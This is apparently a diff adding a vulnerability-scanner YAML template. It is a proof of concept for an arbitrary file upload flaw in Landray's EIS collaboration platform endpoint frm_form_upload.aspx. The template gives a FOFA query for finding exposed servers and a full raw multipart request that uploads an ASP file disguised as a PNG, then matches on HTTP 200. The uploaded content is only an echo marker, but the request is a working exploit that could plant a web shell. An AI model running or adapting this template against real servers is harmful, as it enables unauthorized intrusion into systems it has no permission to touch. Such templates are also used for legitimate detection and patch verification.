@@ -1,0 +1,101 @@
+id: poc-rag63b7qgvggqp51
+info:
+  name: 蓝凌EIS智慧协同平台frm_form_upload.aspx接口存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rag63b7qgvggqp51'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rag63b7qgvggqp51
+    fofa: icon_hash="953405444"||app="Landray-EIS智慧协同平台"
+http:
+- raw:
+  - 'POST /frm/frm_form_upload.aspx HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Cookie: ASP.NET_SessionId=fqq0ks45w4yqpev52l3adnet; FIOA_IMG_FOLDER=FI; Lang=zh-cn
+
+
+    Content-Type: multipart/form-data; boundary=21781d3a946d7ccf8e68fbfe31e2d375
+
+
+
+
+    --21781d3a946d7ccf8e68fbfe31e2d375
+
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+
+
+    /wEPDwUKMTgyMDI2MjI1NQ9kFgJmD2QWAgIBDw8WAh4EVGV4dAUG5L+d5a2YZGRk0b9dFZuWblLyitK8Fh6njh8H4xA=
+
+
+    --21781d3a946d7ccf8e68fbfe31e2d375
+
+
+    Content-Disposition: form-data; name="__EVENTTARGET"
+
+
+
+
+    GB_SAVE
+
+
+    --21781d3a946d7ccf8e68fbfe31e2d375
+
+
+    Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+
+
+    保存
+
+
+    --21781d3a946d7ccf8e68fbfe31e2d375
+
+
+    Content-Disposition: form-data; name="tpfile"; filename="dudesite.asp"
+
+
+    Content-Type: image/png
+
+
+
+
+    <% Response.Write("dudesite") %>
+
+
+    --21781d3a946d7ccf8e68fbfe31e2d375--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    updateOpenerlmg
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
